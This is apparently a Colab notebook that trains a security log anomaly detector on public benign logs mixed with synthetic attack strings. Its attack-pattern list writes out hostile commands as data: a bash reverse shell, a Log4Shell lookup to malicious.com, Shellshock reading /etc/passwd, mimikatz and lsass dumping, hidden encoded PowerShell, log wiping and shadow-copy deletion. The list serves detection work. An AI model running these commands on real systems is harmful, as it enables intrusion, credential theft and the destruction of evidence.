{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wqIOl2d_OOPh",
        "outputId": "8e6f8e38-0db8-4dca-c6d7-b7f9c97e52f8"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "🚀 Setting up Project Quorum Training Environment...\n",
            "  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Building wheel for combo (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "✅ Dependencies installed\n",
            "\n",
            "🎮 GPU Available: []\n"
          ]
        }
      ],
      "source": [
        "print(\"🚀 Setting up Project Quorum Training Environment...\")\n",
        "\n",
        "# Install dependencies\n",
        "!pip install -q pandas numpy scikit-learn pyod joblib tensorflow tqdm combo\n",
        "\n",
        "print(\"✅ Dependencies installed\")\n",
        "\n",
        "# Check GPU availability\n",
        "import tensorflow as tf\n",
        "print(f\"\\n🎮 GPU Available: {tf.config.list_physical_devices('GPU')}\")"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"\\n📥 Downloading datasets...\")\n",
        "\n",
        "import pandas as pd\n",
        "import numpy as np\n",
        "from pathlib import Path\n",
        "\n",
        "# Create directories\n",
        "Path(\"training_data\").mkdir(exist_ok=True)\n",
        "Path(\"models_output\").mkdir(exist_ok=True)\n",
        "\n",
        "# Download benign logs\n",
        "benign_urls = [\n",
        "    ('hdfs', 'https://raw.githubusercontent.com/logpai/loghub/master/HDFS/HDFS_2k.log_structured.csv'),\n",
        "    ('linux', 'https://raw.githubusercontent.com/logpai/loghub/master/Linux/Linux_2k.log_structured.csv'),\n",
        "    ('apache', 'https://raw.githubusercontent.com/logpai/loghub/master/Apache/Apache_2k.log_structured.csv'),\n",
        "    ('windows', 'https://raw.githubusercontent.com/logpai/loghub/master/Windows/Windows_2k.log_structured.csv'),\n",
        "    ('bgl', 'https://raw.githubusercontent.com/logpai/loghub/master/BGL/BGL_2k.log_structured.csv'),\n",
        "]\n",
        "\n",
        "all_benign = []\n",
        "for name, url in benign_urls:\n",
        "    try:\n",
        "        df = pd.read_csv(url)\n",
        "        all_benign.append(df)\n",
        "        print(f\"✅ Downloaded {name}: {len(df)} samples\")\n",
        "    except Exception as e:\n",
        "        print(f\"⚠️ Failed to download {name}: {e}\")\n",
        "\n",
        "# Combine benign logs\n",
        "benign_df = pd.concat(all_benign, ignore_index=True)\n",
        "print(f\"\\n📊 Total benign samples: {len(benign_df)}\")\n",
        "\n",
        "# Generate attack logs\n",
        "import random\n",
        "\n",
        "attack_patterns = [\n",
        "    \"mimikatz.exe executed: sekurlsa::logonpasswords\",\n",
        "    \"procdump64.exe -ma lsass.exe lsass.dmp\",\n",
        "    \"powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcA\",\n",
        "    \"cmd.exe /c whoami && net user && ipconfig /all\",\n",
        "    \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\",\n",
        "    \"psexec.exe \\\\\\\\192.168.1.50 -u admin -p password cmd.exe\",\n",
        "    \"net use \\\\\\\\192.168.1.50\\\\C$ /user:administrator Password123\",\n",
        "    \"wevtutil.exe cl System\",\n",
        "    \"rm -rf /var/log/auth.log\",\n",
        "    \"${jndi:ldap://malicious.com/a} - Log4Shell exploit\",\n",
        "    \"GET /cgi-bin/test.cgi?() { :;}; /bin/bash -c 'cat /etc/passwd'\",\n",
        "    \"vssadmin delete shadows /all /quiet\",\n",
        "    \"File encrypted: document.docx -> document.docx.locked\",\n",
        "    \"admin' OR '1'='1'-- detected in login parameter\",\n",
        "    \"UNION SELECT username,password FROM users--\",\n",
        "    \"Failed password for root from 192.168.1.100 port 22 ssh2\",\n",
        "    \"sudo su - executed by user www-data\",\n",
        "]\n",
        "\n",
        "attack_logs = []\n",
        "for _ in range(int(len(benign_df) * 0.1)):  # 10% attacks\n",
        "    pattern = random.choice(attack_patterns)\n",
        "    pattern = pattern.replace('192.168.1', f'192.168.{random.randint(1,255)}')\n",
        "    attack_logs.append(pattern)\n",
        "\n",
        "attack_df = pd.DataFrame({\n",
        "    'Content': attack_logs,\n",
        "    'Label': ['Anomaly'] * len(attack_logs)\n",
        "})\n",
        "\n",
        "print(f\"✅ Generated {len(attack_df)} synthetic attack samples\")\n",
        "\n",
        "# Combine all data\n",
        "benign_df['Label'] = 'Normal'\n",
        "final_df = pd.concat([\n",
        "    benign_df[['Content', 'Label']],\n",
        "    attack_df\n",
        "], ignore_index=True)\n",
        "\n",
        "# Shuffle\n",
        "final_df = final_df.sample(frac=1, random_state=42).reset_index(drop=True)\n",
        "\n",
        "print(f\"\\n📊 Final Dataset:\")\n",
        "print(f\"   Total: {len(final_df)}\")\n",
        "print(f\"   Normal: {sum(final_df['Label']=='Normal')} ({sum(final_df['Label']=='Normal')/len(final_df)*100:.1f}%)\")\n",
        "print(f\"   Anomaly: {sum(final_df['Label']=='Anomaly')} ({sum(final_df['Label']=='Anomaly')/len(final_df)*100:.1f}%)\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "yg38IPLMOPoV",
        "outputId": "4a960efa-c43b-4291-d7d2-63bb03a631e1"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "📥 Downloading datasets...\n",
            "✅ Downloaded hdfs: 2000 samples\n",
            "✅ Downloaded linux: 2000 samples\n",
            "✅ Downloaded apache: 2000 samples\n",
            "✅ Downloaded windows: 2000 samples\n",
            "✅ Downloaded bgl: 2000 samples\n",
            "\n",
            "📊 Total benign samples: 10000\n",
            "✅ Generated 1000 synthetic attack samples\n",
            "\n",
            "📊 Final Dataset:\n",
            "   Total: 11000\n",
            "   Normal: 10000 (90.9%)\n",
            "   Anomaly: 1000 (9.1%)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"\\n🔧 Feature Engineering...\")\n",
        "\n",
        "import re\n",
        "from sklearn.feature_extraction.text import TfidfVectorizer\n",
        "from sklearn.preprocessing import StandardScaler\n",
        "\n",
        "class SecurityFeatureExtractor:\n",
        "    def __init__(self):\n",
        "        self.ip_pattern = re.compile(r'\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b')\n",
        "        self.port_pattern = re.compile(r':(\\d{1,5})\\b')\n",
        "        self.error_pattern = re.compile(r'\\b(error|fail|denied|unauthorized|forbidden|critical)\\b', re.I)\n",
        "        self.hex_pattern = re.compile(r'\\b0x[0-9a-fA-F]+\\b')\n",
        "        self.suspicious_cmd = re.compile(r'\\b(wget|curl|nc|bash|powershell|cmd|eval|exec)\\b', re.I)\n",
        "\n",
        "    def extract(self, message: str) -> dict:\n",
        "        return {\n",
        "            'has_ip': int(bool(self.ip_pattern.search(message))),\n",
        "            'ip_count': len(self.ip_pattern.findall(message)),\n",
        "            'has_port': int(bool(self.port_pattern.search(message))),\n",
        "            'has_error': int(bool(self.error_pattern.search(message))),\n",
        "            'has_hex': int(bool(self.hex_pattern.search(message))),\n",
        "            'has_suspicious_cmd': int(bool(self.suspicious_cmd.search(message))),\n",
        "            'message_length': len(message),\n",
        "            'special_char_ratio': sum(1 for c in message if not c.isalnum()) / max(len(message), 1),\n",
        "            'digit_ratio': sum(1 for c in message if c.isdigit()) / max(len(message), 1),\n",
        "            'uppercase_ratio': sum(1 for c in message if c.isupper()) / max(len(message), 1),\n",
        "        }\n",
        "\n",
        "# TF-IDF features\n",
        "print(\"  - TF-IDF vectorization...\")\n",
        "vectorizer = TfidfVectorizer(\n",
        "    max_features=3000,\n",
        "    ngram_range=(1, 3),\n",
        "    max_df=0.9,\n",
        "    min_df=3\n",
        ")\n",
        "\n",
        "messages = final_df['Content'].fillna('').tolist()\n",
        "X_tfidf = vectorizer.fit_transform(messages).toarray()\n",
        "\n",
        "# Security features\n",
        "print(\"  - Security features...\")\n",
        "extractor = SecurityFeatureExtractor()\n",
        "security_features = [list(extractor.extract(msg).values()) for msg in messages]\n",
        "X_security = np.array(security_features)\n",
        "\n",
        "# Scale security features\n",
        "scaler = StandardScaler()\n",
        "X_security_scaled = scaler.fit_transform(X_security)\n",
        "\n",
        "# Combine\n",
        "X_combined = np.hstack([X_tfidf, X_security_scaled])\n",
        "y = (final_df['Label'] == 'Anomaly').astype(int).values\n",
        "\n",
        "print(f\"✅ Feature matrix: {X_combined.shape}\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "C3kmzwfvOVkv",
        "outputId": "f60219d2-ab44-48c5-ba38-8a93aa0ec652"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "🔧 Feature Engineering...\n",
            "  - TF-IDF vectorization...\n",
            "  - Security features...\n",
            "✅ Feature matrix: (11000, 3010)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.model_selection import train_test_split\n",
        "\n",
        "X_train, X_test, y_train, y_test = train_test_split(\n",
        "    X_combined, y, test_size=0.2, random_state=42, stratify=y\n",
        ")\n",
        "\n",
        "print(f\"\\n📊 Data Split:\")\n",
        "print(f\"   Train: {len(X_train)} samples\")\n",
        "print(f\"   Test: {len(X_test)} samples\")\n",
        "print(f\"   Train anomaly rate: {sum(y_train)/len(y_train)*100:.1f}%\")\n",
        "print(f\"   Test anomaly rate: {sum(y_test)/len(y_test)*100:.1f}%\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "kEjwDo1BOc_R",
        "outputId": "6c117823-09f3-4c60-c811-5cafc2900bd3"
      },
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "📊 Data Split:\n",
            "   Train: 8800 samples\n",
            "   Test: 2200 samples\n",
            "   Train anomaly rate: 9.1%\n",
            "   Test anomaly rate: 9.1%\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"\\n🤖 Training Ensemble Models...\")\n",
        "\n",
        "from pyod.models.iforest import IForest\n",
        "from pyod.models.lof import LOF\n",
        "from pyod.models.combination import aom\n",
        "\n",
        "# Model 1: Isolation Forest\n",
        "print(\"  - Training Isolation Forest...\")\n",
        "iforest = IForest(\n",
        "    contamination=0.1,\n",
        "    n_estimators=200,\n",
        "    max_samples=256,\n",
        "    random_state=42,\n",
        "    n_jobs=-1\n",
        ")\n",
        "iforest.fit(X_train)\n",
        "print(\"    ✅ IForest trained\")\n",
        "\n",
        "# Model 2: LOF\n",
        "print(\"  - Training LOF...\")\n",
        "lof = LOF(\n",
        "    contamination=0.1,\n",
        "    n_neighbors=20,\n",
        "    algorithm='auto',\n",
        "    n_jobs=-1\n",
        ")\n",
        "lof.fit(X_train)\n",
        "print(\"    ✅ LOF trained\")\n",
        "\n",
        "print(\"✅ Ensemble models trained\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "eHW2UXX2Oeoo",
        "outputId": "36413523-6812-4e76-e442-5b27f4a46300"
      },
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "🤖 Training Ensemble Models...\n",
            "  - Training Isolation Forest...\n",
            "    ✅ IForest trained\n",
            "  - Training LOF...\n",
            "    ✅ LOF trained\n",
            "✅ Ensemble models trained\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"\\n🧠 Training Deep Learning Autoencoder...\")\n",
        "\n",
        "from tensorflow import keras\n",
        "\n",
        "# Build autoencoder\n",
        "encoder = keras.Sequential([\n",
        "    keras.layers.InputLayer(input_shape=(X_train.shape[1],)),\n",
        "    keras.layers.Dense(512, activation='relu'),\n",
        "    keras.layers.Dropout(0.2),\n",
        "    keras.layers.Dense(256, activation='relu'),\n",
        "    keras.layers.Dropout(0.2),\n",
        "    keras.layers.Dense(128, activation='relu'),\n",
        "    keras.layers.Dense(64, activation='relu')\n",
        "])\n",
        "\n",
        "decoder = keras.Sequential([\n",
        "    keras.layers.InputLayer(input_shape=(64,)),\n",
        "    keras.layers.Dense(128, activation='relu'),\n",
        "    keras.layers.Dense(256, activation='relu'),\n",
        "    keras.layers.Dropout(0.2),\n",
        "    keras.layers.Dense(512, activation='relu'),\n",
        "    keras.layers.Dropout(0.2),\n",
        "    keras.layers.Dense(X_train.shape[1], activation='sigmoid')\n",
        "])\n",
        "\n",
        "autoencoder = keras.Sequential([encoder, decoder])\n",
        "\n",
        "autoencoder.compile(\n",
        "    optimizer=keras.optimizers.Adam(learning_rate=0.001),\n",
        "    loss='mse'\n",
        ")\n",
        "\n",
        "# Train on normal data only\n",
        "X_train_normal = X_train[y_train == 0]\n",
        "\n",
        "print(f\"  - Training on {len(X_train_normal)} normal samples...\")\n",
        "history = autoencoder.fit(\n",
        "    X_train_normal, X_train_normal,\n",
        "    epochs=10,\n",
        "    batch_size=256,\n",
        "    validation_split=0.1,\n",
        "    verbose=1,\n",
        "    callbacks=[\n",
        "        keras.callbacks.EarlyStopping(patience=3, restore_best_weights=True)\n",
        "    ]\n",
        ")\n",
        "\n",
        "print(\"✅ Autoencoder trained\")\n",
        "\n",
        "# Convert to TFLite\n",
        "print(\"\\n📦 Converting to TFLite...\")\n",
        "converter = tf.lite.TFLiteConverter.from_keras_model(autoencoder)\n",
        "converter.optimizations = [tf.lite.Optimize.DEFAULT]\n",
        "tflite_model = converter.convert()\n",
        "print(f\"✅ TFLite model size: {len(tflite_model) / 1024:.2f} KB\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xOd3VqZIOhGt",
        "outputId": "71282eb1-4b2f-4ba8-e068-06c9a5a1ca94"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "🧠 Training Deep Learning Autoencoder...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.12/dist-packages/keras/src/layers/core/input_layer.py:27: UserWarning: Argument `input_shape` is deprecated. Use `shape` instead.\n",
            "  warnings.warn(\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "  - Training on 8000 normal samples...\n",
            "Epoch 1/10\n",
            "\u001b[1m29/29\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m6s\u001b[0m 118ms/step - loss: 0.1792 - val_loss: 0.0032\n",
            "Epoch 2/10\n",
            "\u001b[1m29/29\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m3s\u001b[0m 110ms/step - loss: 0.0034 - val_loss: 0.0032\n",
            "Epoch 3/10\n",
            "\u001b[1m29/29\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m4s\u001b[0m 149ms/step - loss: 0.0034 - val_loss: 0.0032\n",
            "Epoch 4/10\n",
            "\u001b[1m29/29\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m3s\u001b[0m 111ms/step - loss: 0.0036 - val_loss: 0.0032\n",
            "✅ Autoencoder trained\n",
            "\n",
            "📦 Converting to TFLite...\n",
            "Saved artifact at '/tmp/tmpe_lo6fj5'. The following endpoints are available:\n",
            "\n",
            "* Endpoint 'serve'\n",
            "  args_0 (POSITIONAL_ONLY): TensorSpec(shape=(None, 3010), dtype=tf.float32, name='keras_tensor_14')\n",
            "Output Type:\n",
            "  TensorSpec(shape=(None, 3010), dtype=tf.float32, name=None)\n",
            "Captures:\n",
            "  133122851919952: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851921296: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851922640: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851920912: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851920720: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851922832: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851923600: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851922064: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851924752: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851925328: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851923792: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851924560: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133123926216912: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851926672: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133123925397136: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "  133122851927632: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
            "✅ TFLite model size: 3426.48 KB\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"\\n📊 Model Evaluation:\")\n",
        "print(\"=\"*70)\n",
        "\n",
        "from sklearn.metrics import classification_report, roc_auc_score, confusion_matrix\n",
        "\n",
        "# Ensemble evaluation\n",
        "iforest_scores = iforest.decision_function(X_test)\n",
        "lof_scores = lof.decision_function(X_test)\n",
        "scores_matrix = np.column_stack([iforest_scores, lof_scores])\n",
        "ensemble_scores = aom(scores_matrix, n_buckets=2)\n",
        "\n",
        "threshold = np.percentile(ensemble_scores, 90)\n",
        "predictions = (ensemble_scores > threshold).astype(int)\n",
        "\n",
        "print(\"\\n🔹 Ensemble Model (IForest + LOF):\")\n",
        "print(classification_report(y_test, predictions, target_names=['Normal', 'Anomaly']))\n",
        "\n",
        "if len(np.unique(y_test)) > 1:\n",
        "    auc = roc_auc_score(y_test, ensemble_scores)\n",
        "    print(f\"ROC-AUC Score: {auc:.4f}\")\n",
        "\n",
        "cm = confusion_matrix(y_test, predictions)\n",
        "print(f\"\\nConfusion Matrix:\")\n",
        "print(f\"  TN: {cm[0,0]}, FP: {cm[0,1]}\")\n",
        "print(f\"  FN: {cm[1,0]}, TP: {cm[1,1]}\")\n",
        "\n",
        "# Autoencoder evaluation\n",
        "print(\"\\n🔹 Autoencoder Model:\")\n",
        "reconstructed = autoencoder.predict(X_test)\n",
        "mse = np.mean(np.square(X_test - reconstructed), axis=1)\n",
        "threshold_ae = np.percentile(mse, 90)\n",
        "predictions_ae = (mse > threshold_ae).astype(int)\n",
        "\n",
        "print(classification_report(y_test, predictions_ae, target_names=['Normal', 'Anomaly']))\n",
        "\n",
        "if len(np.unique(y_test)) > 1:\n",
        "    auc_ae = roc_auc_score(y_test, mse)\n",
        "    print(f\"ROC-AUC Score: {auc_ae:.4f}\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "OzAGgoe0Ondx",
        "outputId": "f91aab0f-2929-4fcb-cab3-9200fa049857"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "📊 Model Evaluation:\n",
            "======================================================================\n",
            "\n",
            "🔹 Ensemble Model (IForest + LOF):\n",
            "              precision    recall  f1-score   support\n",
            "\n",
            "      Normal       0.90      0.89      0.89      2000\n",
            "     Anomaly       0.00      0.00      0.00       200\n",
            "\n",
            "    accuracy                           0.81      2200\n",
            "   macro avg       0.45      0.45      0.45      2200\n",
            "weighted avg       0.82      0.81      0.81      2200\n",
            "\n",
            "ROC-AUC Score: 0.4484\n",
            "\n",
            "Confusion Matrix:\n",
            "  TN: 1780, FP: 220\n",
            "  FN: 200, TP: 0\n",
            "\n",
            "🔹 Autoencoder Model:\n",
            "\u001b[1m69/69\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m2s\u001b[0m 21ms/step\n",
            "              precision    recall  f1-score   support\n",
            "\n",
            "      Normal       0.93      0.92      0.92      2000\n",
            "     Anomaly       0.25      0.28      0.26       200\n",
            "\n",
            "    accuracy                           0.86      2200\n",
            "   macro avg       0.59      0.60      0.59      2200\n",
            "weighted avg       0.87      0.86      0.86      2200\n",
            "\n",
            "ROC-AUC Score: 0.5706\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"\\n💾 Saving models...\")\n",
        "\n",
        "import joblib\n",
        "\n",
        "# Save PyOD models\n",
        "joblib.dump(iforest, 'models_output/iforest_model.pkl')\n",
        "joblib.dump(lof, 'models_output/lof_model.pkl')\n",
        "joblib.dump(vectorizer, 'models_output/tfidf_vectorizer.pkl')\n",
        "joblib.dump(scaler, 'models_output/security_features_scaler.pkl')\n",
        "\n",
        "# Save TFLite\n",
        "with open('models_output/autoencoder.tflite', 'wb') as f:\n",
        "    f.write(tflite_model)\n",
        "\n",
        "# Save metadata\n",
        "import json\n",
        "metadata = {\n",
        "    'version': '2.0.0',\n",
        "    'trained_date': pd.Timestamp.now().isoformat(),\n",
        "    'samples': {\n",
        "        'train': int(len(X_train)),\n",
        "        'test': int(len(X_test)),\n",
        "        'benign': int(sum(y_train==0)),\n",
        "        'anomaly': int(sum(y_train==1))\n",
        "    },\n",
        "    'features': {\n",
        "        'tfidf': int(X_tfidf.shape[1]),\n",
        "        'security': int(X_security.shape[1]),\n",
        "        'total': int(X_combined.shape[1])\n",
        "    },\n",
        "    'performance': {\n",
        "        'ensemble_auc': float(auc),\n",
        "        'autoencoder_auc': float(auc_ae)\n",
        "    }\n",
        "}\n",
        "\n",
        "with open('models_output/model_metadata.json', 'w') as f:\n",
        "    json.dump(metadata, f, indent=2)\n",
        "\n",
        "print(\"✅ Models saved to models_output/\")\n",
        "print(\"\\n📦 Files created:\")\n",
        "print(\"   - iforest_model.pkl\")\n",
        "print(\"   - lof_model.pkl\")\n",
        "print(\"   - tfidf_vectorizer.pkl\")\n",
        "print(\"   - security_features_scaler.pkl\")\n",
        "print(\"   - autoencoder.tflite\")\n",
        "print(\"   - model_metadata.json\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "OZN3bGMyOuAx",
        "outputId": "a4e7a080-8bba-4f2c-989a-520bb4cb34b4"
      },
      "execution_count": 10,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "💾 Saving models...\n",
            "✅ Models saved to models_output/\n",
            "\n",
            "📦 Files created:\n",
            "   - iforest_model.pkl\n",
            "   - lof_model.pkl\n",
            "   - tfidf_vectorizer.pkl\n",
            "   - security_features_scaler.pkl\n",
            "   - autoencoder.tflite\n",
            "   - model_metadata.json\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"\\n🧪 Testing Inference...\")\n",
        "\n",
        "test_logs = [\n",
        "    \"User root logged in successfully\",\n",
        "    \"Connection established from 192.168.1.1\",\n",
        "    \"mimikatz.exe executed: sekurlsa::logonpasswords\",\n",
        "    \"powershell.exe -nop -w hidden -encodedcommand\",\n",
        "    \"Failed password attempt for admin from 10.0.0.5\",\n",
        "]\n",
        "\n",
        "# Prepare features\n",
        "X_test_messages = vectorizer.transform(test_logs).toarray()\n",
        "security_test = np.array([list(extractor.extract(msg).values()) for msg in test_logs])\n",
        "security_test_scaled = scaler.transform(security_test)\n",
        "X_test_combined = np.hstack([X_test_messages, security_test_scaled])\n",
        "\n",
        "# Get predictions\n",
        "iforest_test_scores = iforest.decision_function(X_test_combined)\n",
        "lof_test_scores = lof.decision_function(X_test_combined)\n",
        "test_scores_matrix = np.column_stack([iforest_test_scores, lof_test_scores])\n",
        "ensemble_test_scores = aom(test_scores_matrix, n_buckets=2) # Set n_buckets to 2\n",
        "test_predictions = (ensemble_test_scores > threshold).astype(int)\n",
        "\n",
        "print(\"\\n\" + \"=\"*70)\n",
        "for log, score, pred in zip(test_logs, ensemble_test_scores, test_predictions):\n",
        "    status = \"🚨 ANOMALY\" if pred == 1 else \"✅ NORMAL\"\n",
        "    print(f\"{status} | Score: {score:.4f} | {log[:50]}...\")\n",
        "print(\"=\"*70)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "X2zja5SBOxPj",
        "outputId": "2cc1b76b-2bc1-4b4a-b149-2a9b5c0ff9a2"
      },
      "execution_count": 14,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "🧪 Testing Inference...\n",
            "\n",
            "======================================================================\n",
            "🚨 ANOMALY | Score: 4470577.7140 | User root logged in successfully...\n",
            "🚨 ANOMALY | Score: 2.5225 | Connection established from 192.168.1.1...\n",
            "✅ NORMAL | Score: 0.4889 | mimikatz.exe executed: sekurlsa::logonpasswords...\n",
            "🚨 ANOMALY | Score: 11288153395.2487 | powershell.exe -nop -w hidden -encodedcommand...\n",
            "🚨 ANOMALY | Score: 2.7406 | Failed password attempt for admin from 10.0.0.5...\n",
            "======================================================================\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"\\n📥 Download models to your local machine:\")\n",
        "print(\"\\n# Run this code block to download as ZIP:\")\n",
        "print(\"\"\"\n",
        "!zip -r project_quorum_models.zip models_output/\n",
        "from google.colab import files\n",
        "files.download('project_quorum_models.zip')\n",
        "\"\"\")\n",
        "\n",
        "print(\"\\n✅ TRAINING COMPLETE!\")\n",
        "print(\"\\nNext steps:\")\n",
        "print(\"1. Download the ZIP file\")\n",
        "print(\"2. Extract to backend/data/models/\")\n",
        "print(\"3. Integrate detection engine\")\n",
        "print(\"4. Test the API\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4ZLaYMCtOzmO",
        "outputId": "68ec97b8-306a-487e-a873-0da3baad7be6"
      },
      "execution_count": 15,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "📥 Download models to your local machine:\n",
            "\n",
            "# Run this code block to download as ZIP:\n",
            "\n",
            "!zip -r project_quorum_models.zip models_output/\n",
            "from google.colab import files\n",
            "files.download('project_quorum_models.zip')\n",
            "\n",
            "\n",
            "✅ TRAINING COMPLETE!\n",
            "\n",
            "Next steps:\n",
            "1. Download the ZIP file\n",
            "2. Extract to backend/data/models/\n",
            "3. Integrate detection engine\n",
            "4. Test the API\n"
          ]
        }
      ]
    }
  ]
}